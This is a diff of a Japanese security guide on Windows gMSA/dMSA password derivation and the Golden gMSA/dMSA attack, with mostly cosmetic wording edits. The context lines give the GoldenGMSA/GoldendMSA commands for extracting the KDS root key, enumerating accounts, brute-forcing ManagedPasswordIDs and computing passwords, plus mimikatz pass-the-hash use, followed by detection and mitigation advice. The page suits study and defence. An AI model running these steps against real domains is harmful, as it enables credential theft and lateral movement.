@@ -4,19 +4,19 @@
 
 ## 概要
 
-Windows管理サービスアカウント（MSA）は、パスワードを手動で管理することなくサービスを実行するために設計された特別なプリンシパルです。
+Windows Managed Service Accounts (MSA) は、パスワードを手動で管理することなくサービスを実行するために設計された特別なプリンシパルです。
 主に2つのバリエーションがあります：
 
-1. **gMSA** – グループ管理サービスアカウント – `msDS-GroupMSAMembership`属性で承認された複数のホストで使用できます。
+1. **gMSA** – グループ管理サービスアカウント – `msDS-GroupMSAMembership` 属性で承認された複数のホストで使用できます。
 2. **dMSA** – 委任管理サービスアカウント – gMSAの（プレビュー）後継で、同じ暗号技術に依存しながら、より細かい委任シナリオを可能にします。
 
-両方のバリエーションにおいて、**パスワードは**通常のNTハッシュのように各ドメインコントローラー（DC）に**保存されません**。代わりに、各DCは以下の情報から**現在のパスワードをその場で導出**できます：
+両方のバリエーションにおいて、**パスワードは**通常のNTハッシュのように各ドメインコントローラー（DC）に**保存されません**。代わりに、各DCは以下から現在のパスワードを**導出**できます：
 
-* フォレスト全体の**KDSルートキー**（`KRBTGT\KDS`） – ランダムに生成されたGUID名のシークレットで、`CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`コンテナの下にあるすべてのDCに複製されます。
+* フォレスト全体の**KDSルートキー**（`KRBTGT\KDS`） – ランダムに生成されたGUID名の秘密で、`CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` コンテナの下にあるすべてのDCに複製されます。
 * 対象アカウントの**SID**。
-* `msDS-ManagedPasswordId`属性に見つかるアカウントごとの**ManagedPasswordID**（GUID）。
+* `msDS-ManagedPasswordId` 属性に見つかるアカウントごとの**ManagedPasswordID**（GUID）。
 
-導出は次のようになります：`AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 最終的に**base64エンコード**された240バイトのブロブが`msDS-ManagedPassword`属性に保存されます。
+導出は次のようになります：`AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 最終的に**base64エンコード**され、`msDS-ManagedPassword` 属性に保存される240バイトのブロブ。
 通常のパスワード使用中はKerberosトラフィックやドメインの相互作用は必要なく、メンバーホストは3つの入力を知っている限り、ローカルでパスワードを導出します。
 
 ## Golden gMSA / Golden dMSA攻撃
@@ -32,7 +32,7 @@ Windows管理サービスアカウント（MSA）は、パスワードを手動�
 
 1. **1つのDC**（またはエンタープライズ管理者）の**フォレストレベルの侵害**、またはフォレスト内のDCの1つへの`SYSTEM`アクセス。
 2. サービスアカウントを列挙する能力（LDAP読み取り / RIDブルートフォース）。
-3. [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA)または同等のコードを実行するための.NET ≥ 4.7.2 x64ワークステーション。
+3. [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) または同等のコードを実行するための.NET ≥ 4.7.2 x64ワークステーション。
 
 ### Golden gMSA / dMSA
 ##### フェーズ1 – KDSルートキーの抽出
@@ -55,7 +55,7 @@ GoldenGMSA.exe kdsinfo
 ```
 `RootKey`（GUID名）とラベル付けされたbase64文字列は、後のステップで必要です。
 
-##### フェーズ 2 – gMSA / dMSAオブジェクトの列挙
+##### フェーズ2 – gMSA / dMSAオブジェクトの列挙
 
 少なくとも`sAMAccountName`、`objectSid`、および`msDS-ManagedPasswordId`を取得します：
 ```powershell
@@ -65,7 +65,7 @@ Select sAMAccountName,objectSid,msDS-ManagedPasswordId
 
 GoldenGMSA.exe gmsainfo
 ```
-[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) はヘルパーモードを実装しています:
+[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) はヘルパーモードを実装しています：
 ```powershell
 # LDAP enumeration (kerberos / simple bind)
 GoldendMSA.exe info -d example.local -m ldap
@@ -89,21 +89,21 @@ GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUI
 
 ##### フェーズ 4 – オフラインパスワード計算と変換
 
-ManagedPasswordIDが知られると、有効なパスワードは1コマンドの距離にあります:
+ManagedPasswordIDが知られると、有効なパスワードは1コマンドの距離にあります：
 ```powershell
 # derive base64 password
 GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
 GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
 ```
-結果として得られるハッシュは、**mimikatz**（`sekurlsa::pth`）や**Rubeus**を使用してKerberosを悪用するために注入でき、ステルスな**横移動**と**持続性**を可能にします。
+結果として得られるハッシュは、**mimikatz**（`sekurlsa::pth`）や**Rubeus**を使用してKerberosの悪用に注入でき、ステルスな**横移動**と**持続性**を可能にします。
 
 ## 検出と緩和
 
 * **DCバックアップおよびレジストリハイブの読み取り**機能をTier-0管理者に制限します。
 * DCでの**ディレクトリサービス復元モード（DSRM）**または**ボリュームシャドウコピー**の作成を監視します。
-* サービスアカウントの`CN=Master Root Keys,…`および`userAccountControl`フラグの読み取り/変更を監査します。
+* `CN=Master Root Keys,…`およびサービスアカウントの`userAccountControl`フラグの読み取り/変更を監査します。
 * 異常な**base64パスワードの書き込み**や、ホスト間での突然のサービスパスワードの再利用を検出します。
-* Tier-0の隔離が不可能な場合、高特権のgMSAを**クラシックサービスアカウント**に変換し、定期的なランダムローテーションを行うことを検討します。
+* Tier-0の隔離が不可能な場合、高特権gMSAを**クラシックサービスアカウント**に変換し、定期的なランダムローテーションを検討します。
 
 ## ツール
 
